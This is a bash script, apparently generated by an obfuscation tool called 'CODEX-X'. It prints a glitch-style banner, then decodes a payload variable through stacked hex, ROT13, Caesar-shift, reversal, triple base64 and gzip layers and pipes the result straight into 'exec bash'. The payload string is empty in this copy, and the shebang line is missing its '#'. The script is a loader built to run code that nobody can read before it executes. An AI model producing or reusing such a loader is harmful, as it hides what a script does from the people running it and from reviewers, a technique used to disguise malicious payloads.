!/bin/bash
clear

LIME='\e[38;5;154m'
NC='\e[0m'

glitch_effect() {
    local text="$1"
    local intensity=${2:-30}
    local delay=0.05
    local len=${#text}

    printf '\r\e[K%b' "$text"
    sleep 0.3

    for ((i=0; i<intensity; i++)); do
        local pos=$(( RANDOM % len ))
        local ch=$(tr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | head -c1)
        local col="\e[1;3$(( RANDOM % 6 + 1 ))m"

        printf '\r\e[K%b%b%b%b%b' \
               "${text:0:pos}" \
               "${LIME}${col}${ch}${NC}" \
               "${text:pos+1}"

        sleep "$delay"
    done

    printf '\r\e[K%b\n' "$text"
}

glitch_effect "! WAITING FOR DECODE CODEX ยก"

# [Ultra-Codex] CODEX-X execution (Fast Runtime Edition)

_shft_a8e7qg=24
_payload_FSjaY5x5=''

_asm_HZOJw7vfPRnH() {
    local uppercase="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    local lowercase="abcdefghijklmnopqrstuvwxyz"
    local up_shifted=${uppercase:$_shft_a8e7qg}${uppercase:0:$_shft_a8e7qg}
    local low_shifted=${lowercase:$_shft_a8e7qg}${lowercase:0:$_shft_a8e7qg}
    
    # Fast runtime decryption pipeline
    echo -n "$_payload_FSjaY5x5" | xxd -r -p | \
    tr 'a-zA-Z' 'n-za-mN-ZA-M' | \
    tr 'a-zA-Z' 'n-za-mN-ZA-M' | \
    tr 'a-zA-Z' 'n-za-mN-ZA-M' | \
    tr "$up_shifted$low_shifted" "$uppercase$lowercase" | \
    rev | \
    base64 -d | \
    base64 -d | \
    base64 -d | \
    gzip -d
}
exec bash <(_asm_HZOJw7vfPRnH);
